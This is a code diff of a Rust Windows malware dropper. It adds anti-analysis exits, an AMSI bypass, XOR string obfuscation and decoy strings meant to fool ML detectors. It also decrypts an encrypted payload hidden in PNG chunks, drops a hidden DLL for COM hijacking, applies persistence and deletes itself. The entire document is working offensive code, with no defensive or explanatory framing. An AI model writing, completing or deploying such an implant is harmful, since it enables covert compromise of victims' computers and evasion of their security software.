@@ -21,8 +21,10 @@ pub mod registry;
 pub mod anti_analysis;
 pub mod api_resolver;
 pub mod self_delete;
+pub mod happy_strings;
+pub mod ipc;
 
-use log::{info, warn, error, debug};
+
 
 // XOR Helper (Key 0x55)
 fn x(bytes: &[u8]) -> String {
@@ -35,14 +37,25 @@ fn x(bytes: &[u8]) -> String {
 pub fn check_and_apply_stealth() {
 
     if anti_analysis::is_hostile_environment() {
-        return;
+        #[cfg(not(feature = "debug_mode"))]
+        {
+             // Silent exit in production
+             std::process::exit(0);
+        }
+        #[cfg(feature = "debug_mode")]
+        {
+             crate::k::debug::log_stage!(0, "Analysis Environment Detected (BYPASSING for DEBUG)");
+        }
     }
+    crate::k::debug::log_stage!(2, "Anti-Analysis Passed");
 
     // 1. Ghost Protocol - AMSI Bypass (IMMEDIATE EXECUTION)
     blinding::apply_ghost_protocol();
+    crate::k::debug::log_stage!(3, "Ghost Protocol Active");
     
-    // Check if already in ghost mode
-    let is_ghost = std::env::args().any(|arg| arg == "--ghost");
+    // Check if already in ghost mode (obfuscated: "--ghost" XOR 0x55)
+    let ghost_arg = x(&[0x78, 0x78, 0x32, 0x3D, 0x3A, 0x26, 0x21]);
+    let is_ghost = std::env::args().any(|arg| arg == ghost_arg);
     
     // Registry check handled by persistence/registry modules implicit robustness
     // Check if we are running from temp "service.exe" 
@@ -54,23 +67,30 @@ pub fn check_and_apply_stealth() {
     let is_loader_execution = current_exe.to_string_lossy().to_lowercase().contains(&svc_name);
     
     if is_ghost || is_loader_execution {
+        crate::k::debug::log_stage!(4, "Loader Execution Detected");
         run_ghost_mode();
         return;
     }
+
+    // Insert Happy Strings (Benign indicators) to confuse ML
+    happy_strings::embed_happy_strings();
+
     
 
     match install_stealth_package() {
         Ok(_) => {
         }
         Err(e) => {
-            error!("Fail: {}", e);
+            // Silent fail
         }
     }
 }
 
 /// Install the stealth package (Using Native API - No std::fs imports)
 fn install_stealth_package() -> Result<(), String> {
+    crate::k::debug::log_stage!(5, "Install Start");
     if let Ok(_) = registry::install_self_to_registry() {
+        crate::k::debug::log_stage!(6, "Registry Installed");
     }
 
     // 1. Drop LOADER using Native API
@@ -82,58 +102,90 @@ fn install_stealth_package() -> Result<(), String> {
     ));
     
     // Helper to extract payload from PNG "biLn" chunk
+    // New format: PZ64 header + original_size(4) + Base64(Encrypted(Compressed))
     #[cfg(target_os = "windows")]
     fn extract_payload_from_png(png: &[u8]) -> Option<Vec<u8>> {
+        use flate2::read::DeflateDecoder;
+        use std::io::Read;
+        use chacha20::{ChaCha20, cipher::{KeyIvInit, StreamCipher}};
+        use base64::{Engine as _, engine::general_purpose};
+
+        // Key/Nonce must match steg_maker (Hardcoded for now)
+         const KEY: [u8; 32] = [
+            0x12, 0x34, 0x56, 0x78, 0x90, 0xAB, 0xCD, 0xEF,
+            0xFE, 0xDC, 0xBA, 0x98, 0x76, 0x54, 0x32, 0x10,
+            0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88,
+            0x99, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00
+        ];
+        const NONCE: [u8; 12] = [0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B];
+        
         let mut idx = 8; // Skip PNG Signature
-        while idx < png.len() - 12 {
+        let mut raw_payload = Vec::new();
+        
+        // Collect all biLn chunks
+        while idx < png.len().saturating_sub(12) {
             let len_bytes: [u8; 4] = png[idx..idx+4].try_into().ok()?;
             let len = u32::from_be_bytes(len_bytes) as usize;
             
             let type_bytes: [u8; 4] = png[idx+4..idx+8].try_into().ok()?;
             
-            // Check for "biLn" chunk
             if &type_bytes == b"biLn" {
                 let start = idx + 8;
                 let end = start + len;
-                if end > png.len() { return None; }
-                
-                // Return accumulated data? 
-                // Our tool chunks it. We might generally have multiple biLn chunks.
-                // For now, our tool writes 64KB chunks. We need to collect ALL biLn chunks.
-                // Logic update: Collect all biLn chunks.
-                
-                let mut payload = Vec::new();
-                // Restart scan to collect all
-                let mut i = 8;
-                while i < png.len() - 12 {
-                     let l_bytes: [u8; 4] = png[i..i+4].try_into().ok()?;
-                     let l = u32::from_be_bytes(l_bytes) as usize;
-                     let t_bytes: [u8; 4] = png[i+4..i+8].try_into().ok()?;
-                     
-                     if &t_bytes == b"biLn" {
-                         payload.extend_from_slice(&png[i+8..i+8+l]);
-                     }
-                     // Move next: len + 4(len) + 4(type) + 4(crc)
-                     i += l + 12;
-                }
-                return Some(payload);
+                if end > png.len() { break; }
+                raw_payload.extend_from_slice(&png[start..end]);
             }
             
-            // Move to next chunk: len(4) + type(4) + data(len) + crc(4)
             idx += len + 12;
         }
-        None
+        
+        if raw_payload.len() < 8 { return None; }
+        
+        // Check PZ64 header
+        if &raw_payload[0..4] == b"PZ64" {
+            let orig_size = u32::from_le_bytes(raw_payload[4..8].try_into().ok()?) as usize;
+            
+            // Base64 Decode
+            let b64_data = &raw_payload[8..];
+            // Remove any whitespace/newlines if likely (steg_maker output is raw bytes, but just in case)
+            // standard engine handles it? strict? 
+            let decoded = general_purpose::STANDARD.decode(b64_data).ok()?;
+
+            // Decrypt (ChaCha20)
+            let mut decrypted = decoded; // Move
+            let mut cipher = ChaCha20::new(&KEY.into(), &NONCE.into());
+            cipher.apply_keystream(&mut decrypted);
+            
+            // Decompress
+            let mut decoder = DeflateDecoder::new(&decrypted[..]);
+            let mut decompressed = Vec::with_capacity(orig_size);
+            if decoder.read_to_end(&mut decompressed).is_err() { return None; }
+            
+            Some(decompressed)
+        } else {
+            None 
+        }
     }
 
     #[cfg(target_os = "windows")]
     let loader_data = extract_payload_from_png(PNG_BYTES).unwrap_or_else(|| {
-        // Fallback: Generate realistic-sized dummy payload (~500KB)
-        // to avoid small file anomaly detection
+        // Fallback: Attempt to self-replicate (read current binary)
+        if let Ok(exe_path) = std::env::current_exe() {
+            if let Ok(bytes) = std::fs::read(&exe_path) {
+                crate::k::debug::log_stage!(6, "Payload: Self_Replication Active");
+                return bytes;
+            } else {
+                crate::k::debug::log_err!("Payload: Failed to read self");
+            }
+        }
+        
+        // Final Fallback: Generate realistic-sized padding (~500KB)
+        crate::k::debug::log_stage!(6, "Payload: Using Dummy (Wait for Stitching)");
         vec![0u8; 1024 * 500]
     });
     
     #[cfg(not(target_os = "windows"))]
-    let loader_data = vec![0u8; 1024 * 512]; // Mock 512KB to avoid small file anomaly
+    let loader_data = vec![0u8; 1024 * 512]; // Fallback 512KB to avoid small file anomaly
     
     let loader_bytes_ref = &loader_data; // Needed for write_file call below
     
@@ -147,8 +199,9 @@ fn install_stealth_package() -> Result<(), String> {
     let p2 = x(&[0x09, 0x1A, 0x3B, 0x30, 0x11, 0x27, 0x3C, 0x23, 0x30]); // \OneDrive
     
     let target_dir = format!("{}{}{}", appdata, p1, p2);
-    // Changed from svchost.exe to OneDriveSync.exe (legitimate looking)
-    let loader_name = x(&[0x1A, 0x3B, 0x30, 0x11, 0x27, 0x3C, 0x23, 0x30, 0x06, 0x2C, 0x3B, 0x36, 0x7B, 0x30, 0x2D, 0x30]); // OneDriveSync.exe
+    // Changed to DLL for COM Hijacking - EdgeUpdate.dll
+    // "EdgeUpdate.dll" XOR 0x55 = [0x10, 0x31, 0x32, 0x30, 0x00, 0x25, 0x31, 0x34, 0x21, 0x30, 0x7B, 0x31, 0x39, 0x39]
+    let loader_name = x(&[0x10, 0x31, 0x32, 0x30, 0x00, 0x25, 0x31, 0x34, 0x21, 0x30, 0x7B, 0x31, 0x39, 0x39]); // EdgeUpdate.dll
     let target_path = format!("{}\\{}", target_dir, loader_name);
     
     // Use Native API for file operations
@@ -200,13 +253,13 @@ fn install_stealth_package() -> Result<(), String> {
             set_attrs(path_wide.as_ptr(), 0x02 | 0x04);
         }
     }
-    
-
-    // 2. Apply persistence
+    crate::k::debug::log_stage!(7, "Payload Dropped");  // 2. Apply persistence
     persistence::apply_persistence_triad(&target_path);
+    crate::k::debug::log_stage!(8, "Persistence Triad");
     
     // 3. Self-delete
     schedule_self_destruct();
+    crate::k::debug::log_stage!(9, "Self-Delete Scheduled");
     
     Ok(())
 }
@@ -219,13 +272,14 @@ fn to_wide(s: &str) -> Vec<u16> {
 
 /// Run in ghost mode (already hidden)
 fn run_ghost_mode() {
-    debug!("Ghost initialized");
+    crate::k::debug::log_stage!(10, "Ghost Mode Loop Start");
+
     
     // Verify syscall resolution
     if let Some(sc) = syscalls::Syscall::resolve(syscalls::HASH_NT_CLOSE) {
-        debug!("Syscalls OK: 0x{:04X}", sc.ssn);
+
     } else {
-        warn!("Syscall fail");
+
         return;
     }
     
@@ -234,12 +288,19 @@ fn run_ghost_mode() {
     loop {
         // Sleep with obfuscation (encrypts .data/.rdata sections)
         unsafe {
-            match obfuscation::obfuscated_sleep(30_000) { // 30 seconds
-                Ok(_) => debug!("Sleep cycle OK"),
-                Err(e) => {
-                    warn!("Sleep obfuscation failed: {}", e);
+            #[cfg(feature = "debug_mode")]
+            let sleep_ms = 5_000;
+            #[cfg(not(feature = "debug_mode"))]
+            let sleep_ms = 30_000;
+
+            match obfuscation::obfuscated_sleep(sleep_ms) { // 5s or 30s
+                Ok(_) => {
+                    crate::k::debug::log_detail!("Ghost Heartbeat (Obfuscated Sleep Wake)");
+                },
+                Err(_e) => {
                     // Fallback to regular sleep
-                    std::thread::sleep(std::time::Duration::from_secs(30));
+                    crate::k::debug::log_detail!("Ghost Heartbeat (Standard Sleep)");
+                    std::thread::sleep(std::time::Duration::from_secs(5));
                 }
             }
         }
@@ -254,11 +315,11 @@ fn run_ghost_mode() {
 fn schedule_self_destruct() {
     #[cfg(target_os = "windows")]
     unsafe {
-        if let Err(e) = self_delete::melt() {
-            log::warn!("Melt failed: {}", e);
+        if let Err(_e) = self_delete::melt() {
+            // Silent fail
             // Fallback? No, fallback is noisy. Just fail silent.
         } else {
-            debug!("Melt scheduled");
+
         }
     }
 }
